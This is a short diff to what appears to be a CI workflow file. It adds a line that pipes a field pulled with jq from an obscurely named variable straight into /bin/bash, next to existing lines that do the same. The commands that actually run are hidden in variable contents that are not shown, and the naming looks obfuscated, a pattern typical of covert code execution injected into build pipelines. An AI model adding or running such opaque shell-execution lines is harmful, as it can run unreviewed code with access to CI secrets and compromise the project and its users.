@@ -34,6 +34,7 @@ jobs:
           echo $kp2 | jq -r .gmnqo3 | /bin/bash
           printf '%s' "$maj636" | jq -r .kmr0 | /bin/bash
           echo $nyg18126 | jq -r .z21086 | /bin/bash
+          printf '%s' "$znf9269" | jq -r .n7 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
